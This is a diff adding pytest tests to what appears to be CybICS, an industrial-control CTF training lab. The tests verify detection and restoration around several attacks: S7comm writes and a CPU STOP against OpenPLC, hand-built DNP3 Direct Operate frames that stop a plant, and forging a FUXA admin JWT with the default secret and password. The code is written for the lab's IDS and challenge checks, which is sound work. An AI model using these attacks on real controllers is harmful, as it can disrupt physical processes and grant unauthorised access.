@@ -10,14 +10,19 @@ Tests include:
 - Attack detection and response verification
 """
 
+import json
 import pytest
+import re
+import shlex
 import time
 import os
 import requests
+from datetime import datetime
 from pathlib import Path
 from pymodbus.client import ModbusTcpClient
 from pymodbus.exceptions import ConnectionException, ModbusException
-from conftest import SERVER_IP, CONNECTION_TIMEOUT, OPENPLC_PORT, FUXA_PORT, modbus_call
+from conftest import (SERVER_IP, CONNECTION_TIMEOUT, READ_TIMEOUT, OPENPLC_PORT, FUXA_PORT,
+                      S7_SERVER_PORT, NGINX_PROXY_PORT, IDS_PORT, modbus_call)
 from dotenv import load_dotenv
 
 # Test Configuration
@@ -299,6 +304,1835 @@ class TestFloodOverwrite:
             pytest.fail(f"Modbus connection failed during the write test: {e}")
         except ModbusException as e:
             pytest.fail(f"Modbus exception during write test: {e}")
+
+
+# ===============================================================================
+# S7 Side Door Training Tests
+# ===============================================================================
+
+# OpenPLC's Snap7 server: %MW memory is data block DB1002, two bytes per word.
+S7_MEMORY_DB = 1002
+S7_STOP_OFFSET = 208     # %MW104, Modbus holding register 1128
+S7_MANUAL_OFFSET = 212   # %MW106, Modbus holding register 1130
+STOP_REGISTER = 1128
+MANUAL_REGISTER = 1130
+
+
+class _CtfProgress:
+    """Save and restore the board's CTF progress around a verify test.
+
+    A successful POST /ctf/verify/<id> records the solve, and on a challenge
+    that is already solved it answers "already solved" without running the
+    check. A test takes its challenges out of the progress first and puts the
+    progress back exactly as it was afterwards: /ctf/reset, then the recorded
+    flags submitted again in their original order. A board connected to a
+    CybICS-mgmt event would report those re-submissions; do not run the suite
+    against one.
+    """
+
+    BASE = f"http://{SERVER_IP}:{NGINX_PROXY_PORT}"
+
+    def _progress(self):
+        r = requests.get(f"{self.BASE}/ctf/progress", timeout=READ_TIMEOUT)
+        assert r.status_code == 200, r.text[:200]
+        return list(r.json()["solved_challenge_ids"]), r.json()["total_points"]
+
+    def _set_progress(self, solved):
+        """Make the board's solved list exactly `solved`, in that order."""
+        config = Path(__file__).resolve().parent.parent / "software" / "landing" / "ctf_config.json"
+        flags = {c["id"]: c["flag"] for cat in json.loads(config.read_text())["categories"].values()
+                 for c in cat["challenges"]}
+        assert requests.post(f"{self.BASE}/ctf/reset", timeout=READ_TIMEOUT).json()["success"]
+        for challenge_id in solved:
+            r = requests.post(f"{self.BASE}/ctf/submit", timeout=READ_TIMEOUT,
+                              json={"challenge_id": challenge_id, "flag": flags[challenge_id]})
+            assert r.json().get("success"), f"could not restore {challenge_id}: {r.text[:200]}"
+
+    def _without(self, *challenge_ids):
+        """Take challenge_ids out of the progress; return the progress before."""
+        before = self._progress()
+        if any(c in before[0] for c in challenge_ids):
+            self._set_progress([c for c in before[0] if c not in challenge_ids])
+        return before
+
+    def _restore(self, before):
+        if self._progress() != before:
+            self._set_progress(before[0])
+        assert self._progress() == before, "the board's CTF progress was not restored"
+
+    def _admin(self, command, timeout=90):
+        """Run command in the admin shell; return (exit code, output)."""
+        r = requests.post(f"{self.BASE}/api/webshell/execute", json={"command": command},
+                          timeout=READ_TIMEOUT)
+        assert r.status_code == 200 and r.json().get("success"), r.text[:200]
+        job, output, offset = r.json()["job_id"], "", 0
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            state = requests.get(f"{self.BASE}/api/webshell/jobs/{job}", params={"offset": offset},
+                                 timeout=READ_TIMEOUT).json()
+            output += state["chunk"]
+            offset = state["offset"]
+            if not state["running"]:
+                return state["exit_code"], output
+            time.sleep(0.5)
+        pytest.fail(f"admin shell command did not finish: {command}")
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestS7SideDoor(_CtfProgress):
+    """
+    The S7 Side Door challenge end to end: stop the plant with an S7comm
+    write to OpenPLC's port 102, see the IDS name the write, get the flag
+    from the landing page's verify route, and put the plant back.
+
+    Before the real solve it replays the hole an earlier version of the check
+    had: an S7 stop, an S7 restore, then a stop over Modbus. Verify must refuse
+    that, because only the newest S7 write of the flag counts.
+
+    The plant is restored in a finally block, whatever fails, because a
+    stopped plant would break the other challenges and later tests. The run
+    leaves its s7_write alerts in the IDS buffer; the last one that touches
+    the stop flag writes 0, so it does not pre-arm the challenge for anyone.
+
+    A successful POST /ctf/verify/<id> also records the solve, and on a
+    challenge that is already solved it answers "already solved" without
+    running the check. So the board's CTF progress is read first, the
+    challenge is taken out of it if needed, and afterwards the progress is put
+    back exactly as it was: /ctf/reset, then the recorded flags submitted again
+    in their original order. A board connected to a CybICS-mgmt event would
+    report those re-submissions; do not run the suite against one.
+    """
+
+    BASE = f"http://{SERVER_IP}:{NGINX_PROXY_PORT}"
+    IDS = f"http://{SERVER_IP}:{IDS_PORT}"
+
+    @staticmethod
+    def _s7_client():
+        import snap7  # tests/requirements.txt; a missing library is a failure, not a skip
+        client = snap7.client.Client()
+        client.connect(SERVER_IP, 0, 1, S7_SERVER_PORT)
+        return client
+
+    @staticmethod
+    def _s7_write(client, offset, value):
+        client.db_write(S7_MEMORY_DB, offset, bytearray(value.to_bytes(2, "big")))
+
+    @staticmethod
+    def _modbus_words():
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        try:
+            assert client.connect(), "Modbus not reachable to check the plant state"
+            result = modbus_call(client, client.read_holding_registers, STOP_REGISTER, count=3)
+            assert not result.isError(), result
+            return result.registers[0], result.registers[2]   # stop, manual
+        finally:
+            client.close()
+
+    @staticmethod
+    def _modbus_write_stop(value):
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        try:
+            assert client.connect(), "Modbus not reachable to write the stop flag"
+            result = modbus_call(client, client.write_register, STOP_REGISTER, value)
+            assert not result.isError(), result
+        finally:
+            client.close()
+
+    def _verify(self):
+        r = requests.post(f"{self.BASE}/ctf/verify/s7_sidedoor", json={}, timeout=30)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def _ids_last_alert_id(self):
+        alerts = requests.get(f"{self.IDS}/api/alerts", timeout=READ_TIMEOUT).json()["alerts"]
+        return max((a["id"] for a in alerts), default=0)
+
+    def test_stop_over_s7_is_detected_and_verified_then_restored(self):
+        progress_before = self._progress()
+        if "s7_sidedoor" in progress_before[0]:
+            self._set_progress([c for c in progress_before[0] if c != "s7_sidedoor"])
+        try:
+            self._stop_verify_restore()
+        finally:
+            if self._progress() != progress_before:
+                self._set_progress(progress_before[0])
+        assert self._progress() == progress_before, "the board's CTF progress was not restored"
+
+    def _stop_verify_restore(self):
+        status = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()
+        was_active = status.get("active", False)
+        if not was_active:
+            requests.post(f"{self.IDS}/api/start", timeout=READ_TIMEOUT)
+            time.sleep(2)
+        before = self._ids_last_alert_id()
+
+        client = self._s7_client()
+        try:
+            stop_before, manual_before = self._modbus_words()
+            assert (stop_before, manual_before) == (0, 0), (
+                "the plant was not in automatic operation before the test")
+
+            # A running plant does not pass.
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+
+            # An S7 stop that was restored over S7 does not cover a later
+            # stop by another route (here Modbus FC06 to HR1128).
+            self._s7_write(client, S7_STOP_OFFSET, 1)
+            self._s7_write(client, S7_STOP_OFFSET, 0)
+            time.sleep(2)   # let the IDS log both writes
+            self._modbus_write_stop(1)
+            assert self._modbus_words()[0] == 1
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+            assert "put 0 back" in json.dumps(result["checks"]), result
+            self._modbus_write_stop(0)
+
+            # The attack: one S7comm WriteVar of 1 to DB1002.DBW208.
+            self._s7_write(client, S7_STOP_OFFSET, 1)
+            assert self._modbus_words()[0] == 1, "the S7 write did not reach the PLC's %MW104"
+
+            # The IDS saw it as a write and decoded where it went. Every
+            # change of value is a new alert, so this one is after `before`.
+            deadline = time.time() + 10
+            writes = []
+            while time.time() < deadline and len(writes) < 2:
+                alerts = requests.get(f"{self.IDS}/api/alerts", params={"since_id": before},
+                                      timeout=READ_TIMEOUT).json()["alerts"]
+                writes = [a for a in alerts if a["rule"] == "s7_write"
+                          and any(i["db"] == S7_MEMORY_DB and i["start"] == S7_STOP_OFFSET
+                                  and i["data"] == "0001" for i in a.get("s7_items", []))]
+                time.sleep(0.5)
+            assert len(writes) == 2, f"expected two s7_write alerts setting the stop flag: {writes}"
+            assert writes[-1]["dst"] == "172.18.0.3" and writes[-1]["dport"] == 102
+
+            # The challenge: verify passes and hands out the flag.
+            result = self._verify()
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            # Restore whatever failed above, over S7 so the newest s7_write
+            # alert for the flag is a 0.
+            self._s7_write(client, S7_STOP_OFFSET, 0)
+            self._s7_write(client, S7_MANUAL_OFFSET, 0)
+            client.disconnect()
+            if not was_active:
+                requests.post(f"{self.IDS}/api/stop", timeout=READ_TIMEOUT)
+
+        assert self._modbus_words() == (0, 0), "stop and manual are not back to 0"
+
+
+# ===============================================================================
+# Stop Means Stop? (S7 CPU STOP) Training Tests
+# ===============================================================================
+
+def _load_s7_cpu_stop_script():
+    """training/s7_cpu_stop/s7_cpu_stop.py as a module, so the test uses its SZL decoding."""
+    import importlib.util
+    path = Path(__file__).resolve().parent.parent / "training" / "s7_cpu_stop" / "s7_cpu_stop.py"
+    spec = importlib.util.spec_from_file_location("s7_cpu_stop_solution", path)
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    return module
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestS7CpuStop(_CtfProgress):
+    """
+    Stop Means Stop?: send OpenPLC an S7comm PLC STOP, see the PLC's status
+    list (SZL 0x0424) report STOP while the program keeps running the plant,
+    get the flag from the verify route, and restart the CPU.
+
+    Before the solve it replays what must not pass: verify while the CPU is in
+    RUN, and a STOP followed by a warm restart. The CPU is restarted in a
+    finally block, so the newest s7_cpu_control alert in the IDS buffer is a
+    restart and the status list reads RUN again for the S7comm challenges.
+    Snap7's mode is the only thing the STOP changes; the plant itself is never
+    touched. CTF progress is saved and restored as in TestS7SideDoor.
+    """
+
+    IDS = f"http://{SERVER_IP}:{IDS_PORT}"
+    RUN, STOP = 0x08, 0x04
+
+    @staticmethod
+    def _s7_client():
+        import snap7  # tests/requirements.txt; a missing library is a failure, not a skip
+        client = snap7.client.Client()
+        client.connect(SERVER_IP, 0, 1, S7_SERVER_PORT)
+        return client
+
+    def _verify(self):
+        r = requests.post(f"{self.BASE}/ctf/verify/s7_cpu_stop", json={}, timeout=30)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def _controls_since(self, before, count, timeout=10):
+        deadline = time.time() + timeout
+        found = []
+        while time.time() < deadline:
+            alerts = requests.get(f"{self.IDS}/api/alerts", params={"since_id": before},
+                                  timeout=READ_TIMEOUT).json()["alerts"]
+            found = sorted((a for a in alerts if a["rule"] == "s7_cpu_control"
+                            and a.get("dst") == "172.18.0.3" and a.get("dport") == 102),
+                           key=lambda a: a["id"])
+            if len(found) >= count:
+                break
+            time.sleep(0.5)
+        return found
+
+    @staticmethod
+    def _heartbeats(seconds=3.0):
+        """The values the heartbeat output %QX0.0 (coil 0) takes over a few seconds."""
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        beats = set()
+        try:
+            assert client.connect(), "Modbus not reachable to watch the plant"
+            end = time.time() + seconds
+            while time.time() < end:
+                coils = modbus_call(client, client.read_coils, 0, count=1)
+                assert not coils.isError(), coils
+                beats.add(bool(coils.bits[0]))
+                time.sleep(0.2)
+        finally:
+            client.close()
+        return beats
+
+    def test_stop_is_acknowledged_reported_and_ignored_then_restarted(self):
+        before = self._without("s7_cpu_stop")
+        try:
+            self._stop_verify_restart()
+        finally:
+            self._restore(before)
+
+    def _stop_verify_restart(self):
+        script = _load_s7_cpu_stop_script()
+        status = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()
+        was_active = status.get("active", False)
+        if not was_active:
+            requests.post(f"{self.IDS}/api/start", timeout=READ_TIMEOUT)
+            time.sleep(2)
+
+        plc = self._s7_client()
+        try:
+            assert script.cpu_mode(plc) == self.RUN, "the PLC was not in RUN before the test"
+
+            # A CPU in RUN does not pass.
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+
+            # A STOP that was undone by a restart does not pass either.
+            first = requests.get(f"{self.IDS}/api/alerts", timeout=READ_TIMEOUT).json()["alerts"]
+            before = max((a["id"] for a in first), default=0)
+            assert plc.plc_stop() == 0
+            assert plc.plc_hot_start() == 0
+            controls = self._controls_since(before, 2)
+            assert [a["s7_control"] for a in controls[-2:]] == ["stop", "warm_start"], controls
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+            assert "restarted" in json.dumps(result["checks"]), result
+
+            # The attack: PLC STOP. The PLC acknowledges it and reports STOP.
+            before = controls[-1]["id"]
+            assert plc.plc_stop() == 0, "the PLC refused the STOP job"
+            assert script.cpu_mode(plc) == self.STOP, "SZL 0x0424 does not report STOP"
+            controls = self._controls_since(before, 1)
+            assert controls and controls[-1]["s7_control"] == "stop", controls
+            assert controls[-1]["severity"] == "critical" and controls[-1]["mitre"] == "T0858"
+
+            # ...and the program keeps running: the heartbeat still toggles.
+            beats = self._heartbeats()
+            assert beats == {True, False}, f"heartbeat frozen while in STOP: {beats}"
+            assert script.cpu_mode(plc) == self.STOP
+
+            # The challenge: verify passes and hands out the flag.
+            result = self._verify()
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            # Back to RUN whatever failed above; the restart is the newest
+            # control alert, so the challenge is not left armed.
+            plc.plc_hot_start()
+            mode = script.cpu_mode(plc)
+            plc.disconnect()
+            if not was_active:
+                requests.post(f"{self.IDS}/api/stop", timeout=READ_TIMEOUT)
+
+        assert mode == self.RUN, "the PLC is not back in RUN"
+        newest = self._controls_since(0, 1)
+        assert newest and newest[-1]["s7_control"] == "warm_start", (
+            f"the newest S7 CPU control alert is not the restart: {newest[-1:]}")
+
+
+DNP3_PORT = 20000
+DNP3_OUTSTATION = 10     # OpenPLC dnp3.cfg local_address
+DNP3_MASTER = 1          # dnp3.cfg remote_address
+DNP3_STOP_INDEX = 1128   # analog output 1024 + 104 -> %MW104
+
+
+def _dnp3_crc(data):
+    crc = 0
+    for byte in data:
+        crc ^= byte
+        for _ in range(8):
+            crc = (crc >> 1) ^ 0xA6BC if crc & 1 else crc >> 1
+    return (~crc & 0xFFFF).to_bytes(2, "little")
+
+
+def _dnp3_link_frame(control, dest, source, user=b""):
+    header = bytes([0x05, 0x64, 5 + len(user), control]) + dest.to_bytes(2, "little") \
+        + source.to_bytes(2, "little")
+    frame = header + _dnp3_crc(header)
+    for i in range(0, len(user), 16):
+        block = user[i:i + 16]
+        frame += block + _dnp3_crc(block)
+    return frame
+
+
+def _dnp3_operate_stop(value):
+    """A Direct Operate on Analog Output Int16 1128, built independently of the solution."""
+    import struct
+    user = bytes([0xC0, 0xC1, 0x05, 41, 2, 0x28]) + struct.pack("<HHhB", 1, DNP3_STOP_INDEX, value, 0)
+    return _dnp3_link_frame(0xC4, DNP3_OUTSTATION, DNP3_MASTER, user)
+
+
+def _dnp3_ao_request(func, value, seq=1, dest=DNP3_OUTSTATION, source=DNP3_MASTER,
+                     control=0xC4, transport=0xC0, app=None):
+    """A control request on Analog Output Int16 1128 with function code and app sequence."""
+    import struct
+    app = 0xC0 | seq if app is None else app
+    user = bytes([transport, app, func, 41, 2, 0x28]) \
+        + struct.pack("<HHhB", 1, DNP3_STOP_INDEX, value, 0)
+    return _dnp3_link_frame(control, dest, source, user)
+
+
+def _dnp3_control_status(reply):
+    """The control status the outstation echoed for the (single) point, or None."""
+    if len(reply) < 10 or reply[:2] != b"\x05\x64":
+        return None
+    size = reply[2] - 5
+    user, pos = b"", 10
+    while len(user) < size and pos < len(reply):
+        take = min(16, size - len(user))
+        user += reply[pos:pos + take]
+        pos += take + 2
+    if len(user) < 6 or user[2] != 0x81:
+        return None
+    return user[-1]
+
+
+def _dnp3_send(frame, timeout=3.0):
+    """Send a DNP3 frame to the PLC's outstation and return the raw reply."""
+    import socket
+    with socket.create_connection((SERVER_IP, DNP3_PORT), timeout=timeout) as sock:
+        sock.sendall(frame)
+        sock.settimeout(timeout)
+        try:
+            return sock.recv(1024)
+        except socket.timeout:
+            return b""
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestDnp3SideDoor(_CtfProgress):
+    """
+    The DNP3 Side Door challenge end to end: stop the plant with a hand-built
+    DNP3 Direct Operate to OpenPLC's outstation on port 20000, see the IDS name
+    the command, get the flag from the landing verify route, and restore the
+    plant.
+
+    Before the real solve it replays the hole the newest-alert rule closes: a
+    DNP3 stop, a DNP3 restore, then a stop over Modbus. Verify must refuse that.
+
+    The plant is restored in a finally block whatever fails, over DNP3 so the
+    newest dnp3_operate alert for the stop flag writes 0 and does not pre-arm
+    the challenge for anyone. The board's CTF progress is saved and restored
+    around the test the same way TestS7SideDoor does it.
+
+    An out-of-range operate (index 3000) is sent once and the plant checked
+    afterwards: the OpenPLC fork's dnp3.cpp bounds check must keep the lock
+    from freezing Modbus for every other challenge.
+    """
+
+    BASE = f"http://{SERVER_IP}:{NGINX_PROXY_PORT}"
+    IDS = f"http://{SERVER_IP}:{IDS_PORT}"
+
+    @staticmethod
+    def _modbus_words():
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        try:
+            assert client.connect(), "Modbus not reachable to check the plant state"
+            result = modbus_call(client, client.read_holding_registers, STOP_REGISTER, count=3)
+            assert not result.isError(), result
+            return result.registers[0], result.registers[2]
+        finally:
+            client.close()
+
+    @staticmethod
+    def _modbus_write_stop(value):
+        client = ModbusTcpClient(host=SERVER_IP, port=MODBUS_PORT, timeout=CONNECTION_TIMEOUT)
+        try:
+            assert client.connect(), "Modbus not reachable to write the stop flag"
+            result = modbus_call(client, client.write_register, STOP_REGISTER, value)
+            assert not result.isError(), result
+        finally:
+            client.close()
+
+    def _verify(self):
+        r = requests.post(f"{self.BASE}/ctf/verify/dnp3_sidedoor", json={}, timeout=30)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
+    def _ids_last_alert_id(self):
+        alerts = requests.get(f"{self.IDS}/api/alerts", timeout=READ_TIMEOUT).json()["alerts"]
+        return max((a["id"] for a in alerts), default=0)
+
+    def _wait_for_stop_alert(self, since_id, value, timeout=10):
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            alerts = requests.get(f"{self.IDS}/api/alerts", params={"since_id": since_id},
+                                  timeout=READ_TIMEOUT).json()["alerts"]
+            hits = [a for a in alerts if a["rule"] == "dnp3_operate"
+                    and a.get("dst") == "172.18.0.3" and a.get("dport") == DNP3_PORT
+                    and any(o.get("index") == DNP3_STOP_INDEX and o.get("value") == value
+                            for req in a.get("dnp3", []) for o in req.get("objects", []))]
+            if hits:
+                return hits[-1]
+            time.sleep(0.5)
+        return None
+
+    def test_address_sweep_finds_the_outstation(self):
+        """The outstation answers only its own link address from the master it expects."""
+        answered = {}
+        for dest in (DNP3_OUTSTATION, DNP3_OUTSTATION + 1):
+            for source in (DNP3_MASTER, DNP3_MASTER + 1):
+                reply = _dnp3_send(_dnp3_link_frame(0xC9, dest, source))
+                answered[(dest, source)] = bool(reply)
+        assert answered[(DNP3_OUTSTATION, DNP3_MASTER)], "the right address pair got no reply"
+        assert not any(v for k, v in answered.items() if k != (DNP3_OUTSTATION, DNP3_MASTER)), \
+            f"a wrong address pair answered: {answered}"
+
+    def test_out_of_range_operate_does_not_freeze_the_plant(self):
+        """The critic's hazard: one out-of-range operate used to hold a lock forever."""
+        import struct
+        user = bytes([0xC0, 0xC1, 0x05, 41, 2, 0x28]) + struct.pack("<HHhB", 1, 3000, 1, 0)
+        _dnp3_send(_dnp3_link_frame(0xC4, DNP3_OUTSTATION, DNP3_MASTER, user))
+        time.sleep(1)
+        # Modbus must still answer; a held bufferLock would hang this read.
+        assert self._modbus_words()[0] == 0, "the plant changed or Modbus hung after an out-of-range operate"
+
+    def test_stop_over_dnp3_is_detected_and_verified_then_restored(self):
+        before = self._without("dnp3_sidedoor")
+        try:
+            self._stop_verify_restore()
+        finally:
+            self._restore(before)
+
+    def _stop_verify_restore(self):
+        status = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()
+        was_active = status.get("active", False)
+        if not was_active:
+            requests.post(f"{self.IDS}/api/start", timeout=READ_TIMEOUT)
+            time.sleep(2)
+
+        try:
+            assert self._modbus_words() == (0, 0), "the plant was not in automatic before the test"
+
+            # A running plant does not pass.
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+
+            # The hole the newest-alert rule closes: DNP3 stop, DNP3 restore,
+            # then a stop by Modbus. The newest DNP3 operate on the flag is 0.
+            _dnp3_send(_dnp3_operate_stop(1))
+            _dnp3_send(_dnp3_operate_stop(0))
+            time.sleep(2)
+            self._modbus_write_stop(1)
+            assert self._modbus_words()[0] == 1
+            result = self._verify()
+            assert not result["success"] and "flag" not in result, result
+            assert "put 0 back" in json.dumps(result["checks"]), result
+            self._modbus_write_stop(0)
+
+            # The attack: one DNP3 Direct Operate of 1 to index 1128.
+            before_id = self._ids_last_alert_id()
+            reply = _dnp3_send(_dnp3_operate_stop(1))
+            assert reply, "the outstation did not answer the operate"
+            assert self._modbus_words()[0] == 1, "the DNP3 operate did not reach %MW104"
+
+            alert = self._wait_for_stop_alert(before_id, 1)
+            assert alert is not None, "the IDS logged no dnp3_operate setting the stop flag"
+            request = alert["dnp3"][0]
+            assert request["link_dst"] == DNP3_OUTSTATION and request["link_src"] == DNP3_MASTER
+
+            result = self._verify()
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            # Restore over DNP3 so the newest dnp3_operate for the flag is a 0.
+            _dnp3_send(_dnp3_operate_stop(0))
+            self._modbus_write_stop(0)
+            if not was_active:
+                requests.post(f"{self.IDS}/api/stop", timeout=READ_TIMEOUT)
+
+        assert self._modbus_words() == (0, 0), "stop is not back to 0"
+
+    def test_frames_the_outstation_refuses_earn_nothing(self):
+        """The IDS logs requests; verify must credit only what the PLC carried out.
+
+        For each frame the outstation refuses or drops -- an OPERATE without a
+        SELECT (status 02 NO_SELECT), a Direct Operate to the wrong link
+        address, one with a broken CRC, and the six header variants review
+        found the IDS logged as operates (transport FIR without FIN,
+        application control without FIR/FIN or with UNS or CON set,
+        confirmed-data link control, DIR cleared) -- %MW104 must stay 0, and a
+        Modbus stop afterwards must not earn the flag: the outstation never
+        confirmed any of them. Then select-before-operate, which the
+        outstation does carry out, must.
+        """
+        before = self._without("dnp3_sidedoor")
+        try:
+            self._refused_then_select_before_operate()
+        finally:
+            self._restore(before)
+
+    def _refused_then_select_before_operate(self):
+        import socket
+        status = requests.get(f"{self.IDS}/api/status", timeout=READ_TIMEOUT).json()
+        was_active = status.get("active", False)
+        if not was_active:
+            requests.post(f"{self.IDS}/api/start", timeout=READ_TIMEOUT)
+            time.sleep(2)
+
+        bad_crc = bytearray(_dnp3_operate_stop(1))
+        bad_crc[-1] ^= 0xFF
+        refused = {
+            "operate-without-select": _dnp3_ao_request(0x04, 1),
+            "wrong-outstation": _dnp3_ao_request(0x05, 1, dest=DNP3_OUTSTATION + 1),
+            "bad-crc": bytes(bad_crc),
+            "transport-fir-without-fin": _dnp3_ao_request(0x05, 1, transport=0x40),
+            "app-without-fir-fin": _dnp3_ao_request(0x05, 1, app=0x01),
+            "app-uns": _dnp3_ao_request(0x05, 1, app=0xD1),
+            "app-con": _dnp3_ao_request(0x05, 1, app=0xE1),
+            "confirmed-data-fcv": _dnp3_ao_request(0x05, 1, control=0xF3),
+            "confirmed-data": _dnp3_ao_request(0x05, 1, control=0xD3),
+            "dir-cleared": _dnp3_ao_request(0x05, 1, control=0x44),
+        }
+        answered = ("operate-without-select",)
+        try:
+            assert self._modbus_words() == (0, 0), "the plant was not in automatic before the test"
+            for label, frame in refused.items():
+                reply = _dnp3_send(frame)
+                code = _dnp3_control_status(reply)
+                assert code != 0, f"{label}: the outstation confirmed it: {reply.hex()}"
+                if label in answered:
+                    assert code is not None, f"{label}: no control status in {reply.hex()}"
+                time.sleep(1)
+                assert self._modbus_words()[0] == 0, f"{label}: the refused frame wrote %MW104"
+                self._modbus_write_stop(1)
+                result = self._verify()
+                assert not result["success"] and "flag" not in result, (label, result)
+                self._modbus_write_stop(0)
+
+            # Select-before-operate in one connection: SELECT seq 2, OPERATE seq 3.
+            before_id = self._ids_last_alert_id()
+            with socket.create_connection((SERVER_IP, DNP3_PORT), timeout=3) as sock:
+                sock.settimeout(3)
+                sock.sendall(_dnp3_ao_request(0x03, 1, seq=2))
+                assert _dnp3_control_status(sock.recv(1024)) == 0, "SELECT refused"
+                sock.sendall(_dnp3_ao_request(0x04, 1, seq=3))
+                assert _dnp3_control_status(sock.recv(1024)) == 0, "OPERATE after SELECT refused"
+            assert self._modbus_words()[0] == 1, "select-before-operate did not reach %MW104"
+            assert self._wait_for_stop_alert(before_id, 1) is not None
+            result = self._verify()
+            assert result["success"], result
+            assert result.get("flag", "").startswith("CybICS(")
+        finally:
+            _dnp3_send(_dnp3_operate_stop(0))
+            self._modbus_write_stop(0)
+            if not was_active:
+                requests.post(f"{self.IDS}/api/stop", timeout=READ_TIMEOUT)
+
+        assert self._modbus_words() == (0, 0), "stop is not back to 0"
+
+
+# ===============================================================================
+# Forged HMI Token / Rotate the FUXA Token Key
+# ===============================================================================
+
+def _fuxa_forge(payload, secret="frangoteam751"):
+    """An HS256 JWT, built independently of the landing module under test."""
+    import base64
+    import hashlib
+    import hmac
+
+    def b64(data):
+        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
+    body = b64(json.dumps(payload, separators=(",", ":")).encode())
+    signature = hmac.new(secret.encode(), f"{header}.{body}".encode(), hashlib.sha256).digest()
+    return f"{header}.{body}.{b64(signature)}"
+
+
+def _readme_command(module, marker):
+    """The first line of a fenced command in training/<module>/README.md containing marker."""
+    readme = Path(__file__).resolve().parent.parent / "training" / module / "README.md"
+    for line in readme.read_text(encoding="utf-8").splitlines():
+        if marker in line:
+            return line.strip()
+    raise AssertionError(f"{module}/README.md has no command with {marker!r}")
+
+
+@pytest.mark.usefixtures("stack_ready")
+class TestFuxaJwt(_CtfProgress):
+    """
+    Both FUXA token challenges end to end.
+
+    The attack forges an administrator token for a made-up user with FUXA's
+    default key and pastes it into the landing page's verify route, which must
+    hand out the flag, after refusing a token for a real account, one signed
+    with a wrong key, one shaped exactly like a token FUXA issues itself and
+    one FUXA's unauthenticated token refresh signed. Both tests also
+    pin that refresh flaw before and after the key rotation, as the READMEs
+    describe it, so a FUXA upgrade that changes it is noticed.
+
+    The defence runs the README's commands through the landing page's admin
+    shell (POST /api/webshell/execute, the route the WebShell page uses): back
+    up settings.js, add a random secretCode, check the file loads, restart
+    FUXA. Verify must then pass and the forged token must be refused. A finally
+    block puts the original settings.js back and restarts FUXA, whatever
+    failed, so the default key works again for the attack test, the Harden
+    FUXA Credentials check and every later test. The admin password is never
+    touched; the test asserts that its state is the same before and after.
+    """
+
+    FUXA = f"http://{SERVER_IP}:{FUXA_PORT}"
+    BACKUP = "/_appdata/settings.js.cybics-test"
+
+    # --- helpers ---------------------------------------------------------
+
+    def _container(self):
+        code, out = self._admin("docker ps --filter name=fuxa --format '{{.Names}}'")
+        names = [n for n in out.split() if "fuxa" in n]
+        assert code == 0 and names, f"no FUXA container: {out!r}"
+        return names[0]
+
+    def _fuxa_ready(self, timeout=120):
+        """Wait until FUXA serves its API with authentication on."""
+        deadline = time.time() + timeout
+        while time.time() < deadline:
+            try:
+                settings = requests.get(f"{self.FUXA}/api/settings", timeout=READ_TIMEOUT)
+                users = requests.get(f"{self.FUXA}/api/users", timeout=READ_TIMEOUT)
+                if settings.status_code == 200 and users.status_code == 401:
+                    return
+            except requests.exceptions.RequestException:
+                pass
+            time.sleep(2)
+        pytest.fail("FUXA did not come back with authentication on")
+
+    def _restart_fuxa(self, container):
+        code, out = self._admin(f"docker restart {container}")
+        assert code == 0, out
+        time.sleep(3)
+        self._fuxa_ready()
+
+    def _users_status(self, token):
+        return requests.get(f"{self.FUXA}/api/users", headers={"x-access-token": token},
+                            timeout=READ_TIMEOUT).status_code
+
+    def _refresh_mint(self):
+        """FUXA 1.2.6's unauthenticated token refresh, as documented in the READMEs.
+
+        An invalid token skips the x-auth-user check in verifyToken, and the
+        heartbeat refresh signs {id, groups} straight from that header. If a
+        FUXA upgrade closes or changes this, the assertions using it fail:
+        then update training/fuxa_jwt/README.md, defense_fuxa_jwt/README.md,
+        both Theory lessons and the docstrings of _fuxa_jwt.fuxa_could_issue.
+        """
+        r = requests.post(f"{self.FUXA}/api/heartbeat", json={"params": True}, timeout=READ_TIMEOUT,
+                          headers={"x-access-token": "garbage",
+                                   "x-auth-user": json.dumps({"user": "cybics-test-refresh",
+                                                              "groups": -1})})
+        assert r.status_code == 200 and r.json().get("message") == "tokenRefresh", (
+            f"FUXA's documented token-refresh flaw no longer behaves as described: "
+            f"{r.status_code} {r.text[:200]}")
+        return r.json()["token"]
+
+    def _default_password_works(self):
+        r = requests.post(f"{self.FUXA}/api/signin", json={"username": "admin", "password": "123456"},
+                          timeout=READ_TIMEOUT)
+        return r.status_code == 200 and "error" not in r.text.lower() and r.text.strip() != ""
+
+    def _verify(self, challenge_id, answers=None):
+        body = {"answers": answers} if answers is not None else {}
+        r = requests.post(f"{self.BASE}/ctf/verify/{challenge_id}", json=body, timeout=60)
+        assert r.status_code == 200, r.text[:300]
+        return r.json()
+
